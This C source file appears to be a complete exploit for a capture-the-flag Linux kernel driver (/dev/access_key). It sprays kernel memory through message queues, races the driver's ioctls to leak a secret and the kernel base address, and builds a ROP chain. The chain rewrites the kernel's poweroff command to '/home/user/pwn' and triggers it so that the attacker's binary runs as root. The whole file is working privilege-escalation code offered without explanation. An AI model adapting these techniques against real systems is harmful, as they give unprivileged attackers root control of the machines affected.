#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <string.h>

int fd;

void spray_msgsnd(int count) {
	int i;
        fd = open("/dev/access_key",O_RDWR);
	printf("[*] Starting spray\n");
	for(i=0; i<count; i++) {
		int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		struct {
			long mtype;
			char mtext[10];
		} msg;

		memset(msg.mtext, 0x42, 10);
		msg.mtype = 0x2274f40;

		if(msgsnd(msqid, &msg, sizeof(msg.mtext), 0) < 0){
			perror("msgsnd");
		}
		int wow = ioctl(fd,0xcafeb003,10);
		if(wow == 6)
		{
			printf("FOUND OMG\n");
			return ;
		}
	}
	return;
}

int race_flag = 0;

void * a_out()
{
	printf("[*] Racing\n");
	int j;
	int i;
	for(i=0;i<3000;i++)
	{
		for(j=0;j<256;j++)
			ioctl(fd,0xcafeb001,20);
		unsigned int lol = ioctl(fd,0xcafeb001,20);
		ioctl(fd,0xcafeb002,lol);
		if(race_flag == 2)
			break;
	}
}

int main()
{
	int cnt = 0;

	pthread_t tid;
	unsigned long * pg;
	unsigned long * arrr[90001];

	while(cnt < 40000) {
		pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		if (pg == MAP_FAILED) {
			perror("mmap");
			break;
		}
		else {
			arrr[cnt] = pg;
			memset(pg,0,0x1000);
			*pg = 0xdeadcafebeefbabe;
			cnt++;
			if (cnt % 1000 == 0) {
				printf("[*] allocated at 0x%lx - %d pages, asking for more...\n", pg, cnt);
			}
		}
	}

	printf("[*] number of pages allocated: %d\n", cnt);
	char bufff[200];
	//gets(bufff);

	//pthread_create(&tid, NULL, a_out, NULL);
	spray_msgsnd(20000);
	int jk;
	int by;
	unsigned long leak = 0;
	unsigned long secret = 0;
	for(jk=0;jk<40000;jk++)
	{
		for(by=1;by<(0x1000/8);by += 1)
		{
			if(*(arrr[jk] + by) != 0)
			{
				secret = *(arrr[jk] + by);
				leak = *(arrr[jk] + by + 1);
				leak = leak - 0x1caa50;
				race_flag = 2;
				printf("[+] secret: 0x%lx\n[+] kernel text: 0x%lx\n",secret,leak);
				break;
			}
		}
	}

	if(!leak)
	{
		printf("[-] race failed\n");
		return 0;
	}
	char eren[200];
	sleep(40);

	unsigned int xf;
	while(2>1)
	{
		xf = ioctl(fd,0xcafeb001,20);
		printf("[*] Got magic: 0x%lx\n",xf);
		if(( (xf / 0x100) % 0x10 == 0xf) && (xf / 0x10 ) % 0x10 < 0x5)
			break;
		else
			ioctl(fd,0xcafeb002,xf);
		//if((xf & 0x00000f00 == 0xf00) && ((xf & 0x000000f0) < 0x50))
		//	break;
		//else
		//	ioctl(fd,0xcafeb002,xf);
	}
	unsigned long space1 = ((unsigned long)xf) & 0xfffff000;
	unsigned long space2 = space1 + 0x1000;
	unsigned long * vv = mmap(space1, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE,0,0);
	unsigned long * vvx = mmap(space2, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE,0,0);
	printf("[*] mmap: 0x%lx\n",vv);
	printf("[*] mmap: 0x%lx\n",vvx);
	unsigned long * ropchain = (unsigned long *) malloc(200);
	unsigned long * px = ropchain;
	unsigned long pop_rdi = 0x3dd682;
	unsigned long pop_rsi = 0x19b8;
	unsigned long poweroff_cmd = 0x144f4e0;
	unsigned long mov_rdi_rsi = 0x8619b;
	unsigned long poweroff = 0x87440;
	unsigned long msleep = 0xd4ab0;
	unsigned long copy_from_user_jump = 0x2e42c;
	*ropchain++ = leak + pop_rdi;
	*ropchain++ = leak + poweroff_cmd;
	*ropchain++ = leak + pop_rsi;
	*ropchain++ = 0x73752f656d6f682f;
	*ropchain++ = leak + mov_rdi_rsi;
	*ropchain++ = leak + pop_rdi;
	*ropchain++ = leak + poweroff_cmd + 8;
	*ropchain++ = leak + pop_rsi;
	*ropchain++ = 0x6e77702f7265;
	*ropchain++ = leak + mov_rdi_rsi;
	*ropchain++ = leak + pop_rdi;
	*ropchain++ = 0;
	*ropchain++ = leak + poweroff;
	*ropchain++ = leak + pop_rdi;
	*ropchain++ = 20000;
	*ropchain++ = leak + msleep;
	ropchain = px;

	unsigned long * vvy = mmap(0xfeed000, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE,0,0);
	//*vvy = copy_from_user_jump;
	*vvy = 0x25daf6;
	//gets(eren);
	
	memset(vv,0x42,0x1000);
	memset(vvx,0x42,0x1000);
	memcpy(xf+0x1d,ropchain,128);
	munmap(vvx,0x1000);
	
	ioctl(fd,0xcafeb004,secret);

	return 0;
}
